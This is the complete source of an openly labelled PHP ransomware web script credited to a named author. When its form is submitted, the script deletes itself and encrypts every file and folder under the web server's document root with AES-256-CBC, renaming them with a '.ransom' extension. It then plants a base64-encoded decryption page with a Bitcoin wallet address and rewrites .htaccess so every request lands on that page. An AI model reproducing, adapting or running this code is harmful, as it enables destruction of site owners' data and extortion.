<?php
error_reporting(0);
class Ransomware {
    private $root = '';
    private $salt = '';
    private $cryptoKey = '';
    private $cryptoKeyLength = '32';
    private $iterations = '10000';
    private $algorithm = 'SHA512';
    private $iv = '';
    private $cipher = 'AES-256-CBC';
    private $extension = 'ransom';
    public function __construct($key) {
        $this->root = $_SERVER['DOCUMENT_ROOT'];
        $this->salt = openssl_random_pseudo_bytes(10);
        $this->cryptoKey = openssl_pbkdf2($key, $this->salt, $this->cryptoKeyLength, $this->iterations, $this->algorithm);
        $this->iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length($this->cipher));
    }
    private function generateRandomName($directory, $extension) {
        $randomName = '';
        do {
            $randomName = str_replace(array('+', '/', '='), '', base64_encode(openssl_random_pseudo_bytes(6)));
            $randomName = $directory . '/' . $randomName . '.' . $extension;
        } while (file_exists($randomName));
        return $randomName;
    }
    private function createDecryptionFile() {
        // decryption file encoded in Base64
        $data = base64_decode('PD9waHANCmVycm9yX3JlcG9ydGluZygwKTsNCmNsYXNzIFJhbnNvbXdhcmUgew0KICAgIHByaXZhdGUgJHJvb3QgPSAnPHJvb3Q+JzsNCiAgICBwcml2YXRlICRzYWx0ID0gJyc7DQogICAgcHJpdmF0ZSAkY3J5cHRvS2V5ID0gJyc7DQogICAgcHJpdmF0ZSAkY3J5cHRvS2V5TGVuZ3RoID0gJzxjcnlwdG9LZXlMZW5ndGg+JzsNCiAgICBwcml2YXRlICRpdGVyYXRpb25zID0gJzxpdGVyYXRpb25zPic7DQogICAgcHJpdmF0ZSAkYWxnb3JpdGhtID0gJzxhbGdvcml0aG0+JzsNCiAgICBwcml2YXRlICRpdiA9ICcnOw0KICAgIHByaXZhdGUgJGNpcGhlciA9ICc8Y2lwaGVyPic7DQogICAgcHJpdmF0ZSAkZXh0ZW5zaW9uID0gJzxleHRlbnNpb24+JzsNCiAgICBwdWJsaWMgZnVuY3Rpb24gX19jb25zdHJ1Y3QoJGtleSkgew0KICAgICAgICAkdGhpcy0+c2FsdCA9IGJhc2U2NF9kZWNvZGUoJzxzYWx0PicpOw0KICAgICAgICAkdGhpcy0+Y3J5cHRvS2V5ID0gb3BlbnNzbF9wYmtkZjIoJGtleSwgJHRoaXMtPnNhbHQsICR0aGlzLT5jcnlwdG9LZXlMZW5ndGgsICR0aGlzLT5pdGVyYXRpb25zLCAkdGhpcy0+YWxnb3JpdGhtKTsNCiAgICAgICAgJHRoaXMtPml2ID0gYmFzZTY0X2RlY29kZSgnPGl2PicpOw0KICAgIH0NCiAgICBwcml2YXRlIGZ1bmN0aW9uIGRlbGV0ZURlY3J5cHRpb25GaWxlKCkgew0KICAgICAgICB1bmxpbmsoJHRoaXMtPnJvb3QgLiAnLy5odGFjY2VzcycpOw0KICAgICAgICB1bmxpbmsoJF9TRVJWRVJbJ1NDUklQVF9GSUxFTkFNRSddKTsNCiAgICB9DQogICAgcHJpdmF0ZSBmdW5jdGlvbiBkZWNyeXB0TmFtZSgkcGF0aCkgew0KICAgICAgICAkZGVjcnlwdGVkTmFtZSA9IG9wZW5zc2xfZGVjcnlwdCh1cmxkZWNvZGUocGF0aGluZm8oJHBhdGgsIFBBVEhJTkZPX0ZJTEVOQU1FKSksICR0aGlzLT5jaXBoZXIsICR0aGlzLT5jcnlwdG9LZXksIDAsICR0aGlzLT5pdik7DQogICAgICAgICRkZWNyeXB0ZWROYW1lID0gJGRlY3J5cHRlZE5hbWUgIT09IGZhbHNlID8gc3Vic3RyKCRwYXRoLCAwLCBzdHJyaXBvcygkcGF0aCwgJy8nKSArIDEpIC4gJGRlY3J5cHRlZE5hbWUgOiAkZGVjcnlwdGVkTmFtZTsNCiAgICAgICAgcmV0dXJuICRkZWNyeXB0ZWROYW1lOw0KICAgIH0NCiAgICBwcml2YXRlIGZ1bmN0aW9uIGRlY3J5cHREaXJlY3RvcnkoJGVuY3J5cHRlZERpcmVjdG9yeSkgew0KICAgICAgICBpZiAocGF0aGluZm8oJGVuY3J5cHRlZERpcmVjdG9yeSwgUEFUSElORk9fRVhURU5TSU9OKSA9PT0gJHRoaXMtPmV4dGVuc2lvbikgew0KICAgICAgICAgICAgJGRpcmVjdG9yeSA9ICR0aGlzLT5kZWNyeXB0TmFtZSgkZW5jcnlwdGVkRGlyZWN0b3J5KTsNCiAgICAgICAgICAgIGlmICgkZGlyZWN0b3J5ICE9PSBmYWxzZSkgew0KICAgICAgICAgICAgICAgIHJlbmFtZSgkZW5jcnlwdGVkRGlyZWN0b3J5LCAkZGlyZWN0b3J5KTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCiAgICBwcml2YXRlIGZ1bmN0aW9uIGRlY3J5cHRGaWxlKCRlbmNyeXB0ZWRGaWxlKSB7DQogICAgICAgIGlmIChwYXRoaW5mbygkZW5jcnlwdGVkRmlsZSwgUEFUSElORk9fRVhURU5TSU9OKSA9PT0gJHRoaXMtPmV4dGVuc2lvbikgew0KICAgICAgICAgICAgJGRhdGEgPSBvcGVuc3NsX2RlY3J5cHQoZmlsZV9nZXRfY29udGVudHMoJGVuY3J5cHRlZEZpbGUpLCAkdGhpcy0+Y2lwaGVyLCAkdGhpcy0+Y3J5cHRvS2V5LCAwLCAkdGhpcy0+aXYpOw0KICAgICAgICAgICAgaWYgKCRkYXRhICE9PSBmYWxzZSkgew0KICAgICAgICAgICAgICAgICRmaWxlID0gJHRoaXMtPmRlY3J5cHROYW1lKCRlbmNyeXB0ZWRGaWxlKTsNCiAgICAgICAgICAgICAgICBpZiAoJGZpbGUgIT09IGZhbHNlICYmIHJlbmFtZSgkZW5jcnlwdGVkRmlsZSwgJGZpbGUpKSB7DQogICAgICAgICAgICAgICAgICAgIGZpbGVfcHV0X2NvbnRlbnRzKCRmaWxlLCAkZGF0YSwgTE9DS19FWCk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KICAgIHByaXZhdGUgZnVuY3Rpb24gc2NhbigkZGlyZWN0b3J5KSB7DQogICAgICAgICRmaWxlcyA9IGFycmF5X2RpZmYoc2NhbmRpcigkZGlyZWN0b3J5KSwgYXJyYXkoJy4nLCAnLi4nKSk7DQogICAgICAgIGZvcmVhY2ggKCRmaWxlcyBhcyAkZmlsZSkgew0KICAgICAgICAgICAgaWYgKGlzX2RpcigkZGlyZWN0b3J5IC4gJy8nIC4gJGZpbGUpKSB7DQogICAgICAgICAgICAgICAgJHRoaXMtPnNjYW4oJGRpcmVjdG9yeSAuICcvJyAuICRmaWxlKTsNCiAgICAgICAgICAgICAgICAkdGhpcy0+ZGVjcnlwdERpcmVjdG9yeSgkZGlyZWN0b3J5IC4gJy8nIC4gJGZpbGUpOw0KICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAkdGhpcy0+ZGVjcnlwdEZpbGUoJGRpcmVjdG9yeSAuICcvJyAuICRmaWxlKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gcnVuKCkgew0KICAgICAgICAkdGhpcy0+ZGVsZXRlRGVjcnlwdGlvbkZpbGUoKTsNCiAgICAgICAgaWYgKCR0aGlzLT5jcnlwdG9LZXkgIT09IGZhbHNlKSB7DQogICAgICAgICAgICAkdGhpcy0+c2NhbigkdGhpcy0+cm9vdCk7DQogICAgICAgIH0NCiAgICB9DQp9DQokZXJyb3JNZXNzYWdlcyA9IGFycmF5KCdrZXknID0+ICcnKTsNCmlmIChpc3NldCgkX1NFUlZFUlsnUkVRVUVTVF9NRVRIT0QnXSkgJiYgc3RydG9sb3dlcigkX1NFUlZFUlsnUkVRVUVTVF9NRVRIT0QnXSkgPT09ICdwb3N0Jykgew0KICAgIGlmIChpc3NldCgkX1BPU1RbJ2tleSddKSkgew0KICAgICAgICAkcGFyYW1ldGVycyA9IGFycmF5KCdrZXknID0+ICRfUE9TVFsna2V5J10pOw0KICAgICAgICBtYl9pbnRlcm5hbF9lbmNvZGluZygnVVRGLTgnKTsNCiAgICAgICAgJGVycm9yID0gZmFsc2U7DQogICAgICAgIGlmIChtYl9zdHJsZW4oJHBhcmFtZXRlcnNbJ2tleSddKSA8IDEpIHsNCiAgICAgICAgICAgICRlcnJvck1lc3NhZ2VzWydrZXknXSA9ICdQbGVhc2UgZW50ZXIgZGVjcnlwdGlvbiBrZXknOw0KICAgICAgICAgICAgJGVycm9yID0gdHJ1ZTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoISRlcnJvcikgew0KICAgICAgICAgICAgJHJhbnNvbXdhcmUgPSBuZXcgUmFuc29td2FyZSgkcGFyYW1ldGVyc1sna2V5J10pOw0KICAgICAgICAgICAgJHJhbnNvbXdhcmUtPnJ1bigpOw0KICAgICAgICAgICAgaGVhZGVyKCdMb2NhdGlvbjogLycpOw0KICAgICAgICAgICAgZXhpdCgpOw0KICAgICAgICB9DQogICAgfQ0KfQ0KJGltZyA9ICdpVkJPUncwS0dnb0FBQUFOU1VoRVVnQUFBSllBQUFDV0NBSUFBQUN6WSthMUFBQUFCbUpMUjBRQS93RC9BUCtndmFlVEFBQURZa2xFUVZSNG5PMmR5MjdqTUF3QW5VWC8vNWZUd3hZNUNJNGdoYVRrY1dZdUMyejhhZ2RFV0lta0g4L244eEF5LzNZL2dFVDUrZi9QNC9GWWM3K3BvRytlcWpsMzJhZDlJdWRHZU4zWEtNU2pRandxeEtOQ1BEK24vNXY0bDBiLzY3MmZWdlNweTR3aU4wbzh0K0hkUXhxRmVGU0lSNFY0VklqblBKMXBpS3hXUkE3dWY5clBVQ0tQMFZ3NU1kbXArRTBhaFhoVWlFZUZlRlNJWnlpZHFTUHg2MzBxNlloa0tNdTJrd1l4Q3ZHb0VJOEs4YWdReitaMFpxcWtwWDl1QTZMK0pRV2pFSThLOGFnUWp3cnhES1V6ZFVYN1U0bkQxSkpLWW9hUytPTlgvQ2FOUWp3cXhLTkNQQ3JFYzU3TzdGcWVTT3cvU3V4ZG1ycHkvK0FLakVJOEtzU2pRandxeFBPNDFMaUV1bEtheUs3V3hURUs4YWdRandyeHFCQlAvdHladWwyZXhPV1lYV05vRWo5OVlSVGlVU0VlRmVKUklaNmgxWmxsbmNxN0J1VkYrcDdxSnRvTW5tc1U0bEVoSGhYaVVTR2VUMHFCcDFaSjZsaFdTalBWWUpWWVdlUGNtVzlCaFhoVWlFZUZlSVkybXhJbjR5MnJqcG02YitJWXZjUVJ3bTQyZlFzcXhLTkNQQ3JFODVmTzFEWCtKSjZidUt1MWE4OHJjcU4zR0lWNFZJaEhoWGhVaU9ldmRtWkJpY2ZJd1ZQMzNmVVlkUzNnbjkzWEtNU2pRandxeEtOQ1BPZnB6TEl2OEdYRDdxN1p0MjN0akJ5SENtK0FDdkdvRUUvNUdMMjZ1cHZJbWxIZERsSGl3WU1ZaFhoVWlFZUZlRlNJWjZoMkpySmFVYmNIMUw5UlpLT3FMcXVxcUpNMkN2R29FSThLOGFnUXozbG5FMklQYU5mc3V3Z1ZWellLOGFnUWp3cnhxQkJQUXUxTWU4V0MvWlE0ZFQ5ZzR0S1ZtMDFmaWdyeHFCQ1BDdkVNamRGcm1Qb1N2c2c0M3NSUDYzSzlxWVBkYkxvUEtzU2pRandxeEpNL0ZiaGhXZFBRc3IybnFjZEl2SkZqOUc2TEN2R29FSThLOFd4K28zWmQvM1RpL3RHeTRYNVR1RHB6SDFTSVI0VjRWSWduLzQzYWZSSzdxeE92dkt2QnlxbkFjaHdxdkFFcXhLTkNQT2ViVFhXOVBQMGJKYzRNM2pYcnIrNmRUZThPTmdyeHFCQ1BDdkdvRU05UTdjeXlOeE1rMXRFMjFEVXI3WHEvMVF1akVJOEs4YWdRandyeGZOTFpWRWVrcGFnaGNVbGwyVnZBUDh0dWpFSThLc1NqUWp3cXhIT3RkS1loa3QwczJ4SnFxS3RDc3JQcHRxZ1Fqd3J4cUJEUEo0M2F5NmlyN28wVTdQWlozeUJ1Rk9KUklSNFY0bEVobnZKWFVDNWoxN0NZL3FVV0xDRVpoWGhVaUVlRmVGU0laL1BjR1lsakZPSlJJWjVmZWd0VFVBWHBWaFVBQUFBQVNVVk9SSzVDWUlJPSc7DQo/Pg0KPCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJlbiI+DQoJPGhlYWQ+DQoJCTxtZXRhIGNoYXJzZXQ9IlVURi04Ij4NCgkJPHRpdGxlPlJhbnNvbXdhcmU8L3RpdGxlPg0KCQk8bWV0YSBuYW1lPSJkZXNjcmlwdGlvbiIgY29udGVudD0iUmFuc29td2FyZSB3cml0dGVuIGluIFBIUC4iPg0KCQk8bWV0YSBuYW1lPSJrZXl3b3JkcyIgY29udGVudD0iSFRNTCwgQ1NTLCBQSFAsIHJhbnNvbXdhcmUiPg0KCQk8bWV0YSBuYW1lPSJhdXRob3IiIGNvbnRlbnQ9Ikl2YW4gxaBpbmNlayI+DQoJCTxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MS4wIj4NCgkJPHN0eWxlPg0KCQkJaHRtbCB7DQoJCQkJaGVpZ2h0OiAxMDAlOw0KCQkJfQ0KCQkJYm9keSB7DQoJCQkJYmFja2dyb3VuZC1jb2xvcjogIzI2MjYyNjsNCgkJCQlkaXNwbGF5OiBmbGV4Ow0KCQkJCWZsZXgtZGlyZWN0aW9uOiBjb2x1bW47DQoJCQkJbWFyZ2luOiAwOw0KCQkJCWhlaWdodDogaW5oZXJpdDsNCgkJCQljb2xvcjogI0Y4RjhGODsNCgkJCQlmb250LWZhbWlseTogQXJpYWwsIEhlbHZldGljYSwgc2Fucy1zZXJpZjsNCgkJCQlmb250LXNpemU6IDFlbTsNCgkJCQlmb250LXdlaWdodDogNDAwOw0KCQkJCXRleHQtYWxpZ246IGxlZnQ7DQoJCQl9DQoJCQkuZnJvbnQtZm9ybSB7DQoJCQkJZGlzcGxheTogZmxleDsNCgkJCQlmbGV4LWRpcmVjdGlvbjogY29sdW1uOw0KCQkJCWFsaWduLWl0ZW1zOiBjZW50ZXI7DQoJCQkJanVzdGlmeS1jb250ZW50OiBjZW50ZXI7DQoJCQkJZmxleDogMSAwIGF1dG87DQoJCQkJcGFkZGluZzogMC41ZW07DQoJCQl9DQoJCQkuZnJvbnQtZm9ybSAubGF5b3V0IHsNCgkJCQliYWNrZ3JvdW5kLWNvbG9yOiAjRENEQ0RDOw0KCQkJCXBhZGRpbmc6IDEuNWVtOw0KCQkJCXdpZHRoOiAyMWVtOw0KCQkJCWNvbG9yOiAjMDAwOw0KCQkJCWJvcmRlcjogMC4wN2VtIHNvbGlkICMwMDA7DQoJCQl9DQoJCQkuZnJvbnQtZm9ybSAubGF5b3V0IGhlYWRlciB7DQoJCQkJdGV4dC1hbGlnbjogY2VudGVyOw0KCQkJfQ0KCQkJLmZyb250LWZvcm0gLmxheW91dCBoZWFkZXIgLnRpdGxlIHsNCgkJCQltYXJnaW46IDA7DQoJCQkJZm9udC1zaXplOiAyLjZlbTsNCgkJCQlmb250LXdlaWdodDogNDAwOw0KCQkJfQ0KCQkJLmZyb250LWZvcm0gLmxheW91dCAuYWJvdXQgew0KCQkJCXRleHQtYWxpZ246IGNlbnRlcjsNCgkJCX0NCgkJCS5mcm9udC1mb3JtIC5sYXlvdXQgLmFib3V0IHAgew0KCQkJCW1hcmdpbjogMWVtIDA7DQoJCQkJY29sb3I6ICMyRjRGNEY7DQoJCQkJZm9udC13ZWlnaHQ6IDYwMDsNCgkJCQl3b3JkLXdyYXA6IGJyZWFrLXdvcmQ7DQoJCQl9DQoJCQkuZnJvbnQtZm9ybSAubGF5b3V0IC5hYm91dCBpbWcgew0KCQkJCWJvcmRlcjogMC4wN2VtIHNvbGlkICMwMDA7DQoJCQl9DQoJCQkuZnJvbnQtZm9ybSAubGF5b3V0IGZvcm0gew0KCQkJCWRpc3BsYXk6IGZsZXg7DQoJCQkJZmxleC1kaXJlY3Rpb246IGNvbHVtbjsNCgkJCQltYXJnaW4tdG9wOiAxZW07DQoJCQl9DQoJCQkuZnJvbnQtZm9ybSAubGF5b3V0IGZvcm0gaW5wdXQgew0KCQkJCS13ZWJraXQtYXBwZWFyYW5jZTogbm9uZTsNCgkJCQktbW96LWFwcGVhcmFuY2U6IG5vbmU7DQoJCQkJYXBwZWFyYW5jZTogbm9uZTsNCgkJCQltYXJnaW46IDA7DQoJCQkJcGFkZGluZzogMC4yZW0gMC40ZW07DQoJCQkJZm9udC1mYW1pbHk6IEFyaWFsLCBIZWx2ZXRpY2EsIHNhbnMtc2VyaWY7DQoJCQkJZm9udC1zaXplOiAxZW07DQoJCQkJYm9yZGVyOiAwLjA3ZW0gc29saWQgIzlEMkEwMDsNCgkJCQktd2Via2l0LWJvcmRlci1yYWRpdXM6IDA7DQoJCQkJLW1vei1ib3JkZXItcmFkaXVzOiAwOw0KCQkJCWJvcmRlci1yYWRpdXM6IDA7DQoJCQl9DQoJCQkuZnJvbnQtZm9ybSAubGF5b3V0IGZvcm0gaW5wdXRbdHlwZT0ic3VibWl0Il0gew0KCQkJCWJhY2tncm91bmQtY29sb3I6ICNGRjQ1MDA7DQoJCQkJY29sb3I6ICNGOEY4Rjg7DQoJCQkJY3Vyc29yOiBwb2ludGVyOw0KCQkJCXRyYW5zaXRpb246IGJhY2tncm91bmQtY29sb3IgMjIwbXMgbGluZWFyOw0KCQkJfQ0KCQkJLmZyb250LWZvcm0gLmxheW91dCBmb3JtIGlucHV0W3R5cGU9InN1Ym1pdCJdOmhvdmVyIHsNCgkJCQliYWNrZ3JvdW5kLWNvbG9yOiAjRDgzQTAwOw0KCQkJCXRyYW5zaXRpb246IGJhY2tncm91bmQtY29sb3IgMjIwbXMgbGluZWFyOw0KCQkJfQ0KCQkJLmZyb250LWZvcm0gLmxheW91dCBmb3JtIC5lcnJvciB7DQoJCQkJbWFyZ2luOiAwIDAgMWVtIDA7DQoJCQkJY29sb3I6ICM5RDJBMDA7DQoJCQkJZm9udC1zaXplOiAwLjhlbTsNCgkJCX0NCgkJCS5mcm9udC1mb3JtIC5sYXlvdXQgZm9ybSAuZXJyb3I6bm90KDplbXB0eSkgew0KCQkJCW1hcmdpbjogMC4yZW0gMCAxZW0gMDsNCgkJCX0NCgkJCS5mcm9udC1mb3JtIC5sYXlvdXQgZm9ybSBsYWJlbCB7DQoJCQkJbWFyZ2luLWJvdHRvbTogMC4yZW07DQoJCQkJaGVpZ2h0OiAxLjJlbTsNCgkJCX0NCgkJCUBtZWRpYSBzY3JlZW4gYW5kIChtYXgtd2lkdGg6IDQ4MHB4KSB7DQoJCQkJLmZyb250LWZvcm0gLmxheW91dCB7DQoJCQkJCXdpZHRoOiAxNS41ZW07DQoJCQkJfQ0KCQkJfQ0KCQkJQG1lZGlhIHNjcmVlbiBhbmQgKG1heC13aWR0aDogMzIwcHgpIHsNCgkJCQkuZnJvbnQtZm9ybSAubGF5b3V0IHsNCgkJCQkJd2lkdGg6IDE0LjVlbTsNCgkJCQl9DQoJCQkJLmZyb250LWZvcm0gLmxheW91dCBoZWFkZXIgLnRpdGxlIHsNCgkJCQkJZm9udC1zaXplOiAyLjRlbTsNCgkJCQl9DQoJCQkJLmZyb250LWZvcm0gLmxheW91dCAuYWJvdXQgcCB7DQoJCQkJCWZvbnQtc2l6ZTogMC45ZW07DQoJCQkJfQ0KCQkJfQ0KCQk8L3N0eWxlPg0KCTwvaGVhZD4NCgk8Ym9keT4NCgkJPGRpdiBjbGFzcz0iZnJvbnQtZm9ybSI+DQoJCQk8ZGl2IGNsYXNzPSJsYXlvdXQiPg0KCQkJCTxoZWFkZXI+DQoJCQkJCTxoMSBjbGFzcz0idGl0bGUiPlJhbnNvbXdhcmU8L2gxPg0KCQkJCTwvaGVhZGVyPg0KCQkJCTxkaXYgY2xhc3M9ImFib3V0Ij4NCgkJCQkJPHA+TWFkZSBieSBJdmFuIMWgaW5jZWsuPC9wPg0KCQkJCQk8cD5JIGhvcGUgeW91IGxpa2UgaXQhPC9wPg0KCQkJCQk8cD5GZWVsIGZyZWUgdG8gZG9uYXRlIGJpdGNvaW4uPC9wPg0KCQkJCQk8aW1nIHNyYz0iZGF0YTppbWFnZS9naWY7YmFzZTY0LDw/cGhwIGVjaG8gJGltZzsgPz4iIGFsdD0iQml0Y29pbiBXYWxsZXQiPg0KCQkJCQk8cD4xQnJaTTZUN0c5Uk44dmJhYm5mWHU0TTZMcGd6dHE2WTE0PC9wPg0KCQkJCTwvZGl2Pg0KCQkJCTxmb3JtIG1ldGhvZD0icG9zdCIgYWN0aW9uPSI8P3BocCBlY2hvICcuLycgLiBwYXRoaW5mbygkX1NFUlZFUlsnU0NSSVBUX0ZJTEVOQU1FJ10sIFBBVEhJTkZPX0JBU0VOQU1FKTsgPz4iPg0KCQkJCQk8bGFiZWwgZm9yPSJrZXkiPkRlY3J5cHRpb24gS2V5PC9sYWJlbD4NCgkJCQkJPGlucHV0IG5hbWU9ImtleSIgaWQ9ImtleSIgdHlwZT0idGV4dCIgc3BlbGxjaGVjaz0iZmFsc2UiIGF1dG9mb2N1cz0iYXV0b2ZvY3VzIj4NCgkJCQkJPHAgY2xhc3M9ImVycm9yIj48P3BocCBlY2hvICRlcnJvck1lc3NhZ2VzWydrZXknXTsgPz48L3A+DQoJCQkJCTxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJEZWNyeXB0Ij4NCgkJCQk8L2Zvcm0+DQoJCQk8L2Rpdj4NCgkJPC9kaXY+DQoJPC9ib2R5Pg0KPC9odG1sPg0K');
        $data = str_replace(array('<root>', '<salt>', '<cryptoKeyLength>', '<iterations>', '<algorithm>', '<iv>', '<cipher>', '<extension>'), array($this->root, base64_encode($this->salt), $this->cryptoKeyLength, $this->iterations, $this->algorithm, base64_encode($this->iv), $this->cipher, $this->extension), $data);
        $decryptionFile = $this->generateRandomName($this->root, 'php');
        file_put_contents($decryptionFile, $data, LOCK_EX);
        $decryptionFile = pathinfo($decryptionFile, PATHINFO_BASENAME);
        file_put_contents($this->root . '/.htaccess', "DirectoryIndex /{$decryptionFile}\nErrorDocument 400 /{$decryptionFile}\nErrorDocument 401 /{$decryptionFile}\nErrorDocument 403 /{$decryptionFile}\nErrorDocument 404 /{$decryptionFile}\nErrorDocument 500 /{$decryptionFile}\n", LOCK_EX);
    }
    private function encryptName($path) {
        $encryptedName = '';
        do {
            $encryptedName = openssl_encrypt(pathinfo($path, PATHINFO_BASENAME), $this->cipher, $this->cryptoKey, 0, $this->iv);
            $encryptedName = $encryptedName !== false ? substr($path, 0, strripos($path, '/') + 1) . urlencode($encryptedName) . '.' . $this->extension : $encryptedName;
        } while ($encryptedName !== false && file_exists($encryptedName));
        return $encryptedName;
    }
    private function encryptDirectory($directory) {
        $encryptedDirectory = $this->encryptName($directory);
        if ($encryptedDirectory !== false) {
            rename($directory, $encryptedDirectory);
        }
    }
    private function encryptFile($file) {
        $encryptedData = openssl_encrypt(file_get_contents($file), $this->cipher, $this->cryptoKey, 0, $this->iv);
        if ($encryptedData !== false) {
            $encryptedFile = $this->encryptName($file);
            if ($encryptedFile !== false && rename($file, $encryptedFile)) {
                file_put_contents($encryptedFile, $encryptedData, LOCK_EX);
            }
        }
    }
    private function scan($directory) {
        $files = array_diff(scandir($directory), array('.', '..'));
        foreach ($files as $file) {
            if (is_dir($directory . '/' . $file)) {
                $this->scan($directory . '/' . $file);
                $this->encryptDirectory($directory . '/' . $file);
            } else {
                $this->encryptFile($directory . '/' . $file);
            }
        }
    }
    public function run() {
        unlink($_SERVER['SCRIPT_FILENAME']);
        if ($this->cryptoKey !== false) {
            $this->scan($this->root);
            $this->createDecryptionFile();
        }
    }
}
$errorMessages = array('key' => '');
if (isset($_SERVER['REQUEST_METHOD']) && strtolower($_SERVER['REQUEST_METHOD']) === 'post') {
    if (isset($_POST['key'])) {
        $parameters = array('key' => $_POST['key']);
        mb_internal_encoding('UTF-8');
        $error = false;
        if (mb_strlen($parameters['key']) < 1) {
            $errorMessages['key'] = 'Please enter encryption key';
            $error = true;
        }
        if (!$error) {
            $ransomware = new Ransomware($parameters['key']);
            $ransomware->run();
            header('Location: /');
            exit();
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<title>Ransomware</title>
		<meta name="description" content="Ransomware written in PHP.">
		<meta name="keywords" content="HTML, CSS, PHP, ransomware">
		<meta name="author" content="Ivan Šincek">
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<style>
			html {
				height: 100%;
			}
			body {
				background-color: #262626;
				display: flex;
				flex-direction: column;
				margin: 0;
				height: inherit;
				color: #F8F8F8;
				font-family: Arial, Helvetica, sans-serif;
				font-size: 1em;
				font-weight: 400;
				text-align: left;
			}
			.front-form {
				display: flex;
				flex-direction: column;
				align-items: center;
				justify-content: center;
				flex: 1 0 auto;
				padding: 0.5em;
			}
			.front-form .layout {
				background-color: #DCDCDC;
				padding: 1.5em;
				width: 21em;
				color: #000;
				border: 0.07em solid #000;
			}
			.front-form .layout header {
				text-align: center;
			}
			.front-form .layout header .title {
				margin: 0;
				font-size: 2.6em;
				font-weight: 400;
			}
			.front-form .layout header p {
				margin: 0;
				font-size: 1.2em;
			}
			.front-form .layout .advice p {
				margin: 1em 0 0 0;
			}
			.front-form .layout form {
				display: flex;
				flex-direction: column;
				margin-top: 1em;
			}
			.front-form .layout form input {
				-webkit-appearance: none;
				-moz-appearance: none;
				appearance: none;
				margin: 0;
				padding: 0.2em 0.4em;
				font-family: Arial, Helvetica, sans-serif;
				font-size: 1em;
				border: 0.07em solid #9D2A00;
				-webkit-border-radius: 0;
				-moz-border-radius: 0;
				border-radius: 0;
			}
			.front-form .layout form input[type="submit"] {
				background-color: #FF4500;
				color: #F8F8F8;
				cursor: pointer;
				transition: background-color 220ms linear;
			}
			.front-form .layout form input[type="submit"]:hover {
				background-color: #D83A00;
				transition: background-color 220ms linear;
			}
			.front-form .layout form .error {
				margin: 0 0 1em 0;
				color: #9D2A00;
				font-size: 0.8em;
			}
			.front-form .layout form .error:not(:empty) {
				margin: 0.2em 0 1em 0;
			}
			.front-form .layout form label {
				margin-bottom: 0.2em;
				height: 1.2em;
			}
			@media screen and (max-width: 480px) {
				.front-form .layout {
					width: 15.5em;
				}
			}
			@media screen and (max-width: 320px) {
				.front-form .layout {
					width: 14.5em;
				}
				.front-form .layout header .title {
					font-size: 2.4em;
				}
				.front-form .layout header p {
					font-size: 1.1em;
				}
				.front-form .layout .advice p {
					font-size: 0.9em;
				}
			}
		</style>
	</head>
	<body>
		<div class="front-form">
			<div class="layout">
				<header>
					<h1 class="title">Ransomware</h1>
					<p>Made by Ivan Šincek</p>
				</header>
				<form method="post" action="<?php echo './' . pathinfo($_SERVER['SCRIPT_FILENAME'], PATHINFO_BASENAME); ?>">
					<label for="key">Encryption Key</label>
					<input name="key" id="key" type="text" spellcheck="false" autofocus="autofocus">
					<p class="error"><?php echo $errorMessages['key']; ?></p>
					<input type="submit" value="Encrypt">
				</form>
				<div class="advice">
					<p>Backup your server files!</p>
				</div>
			</div>
		</div>
	</body>
</html>
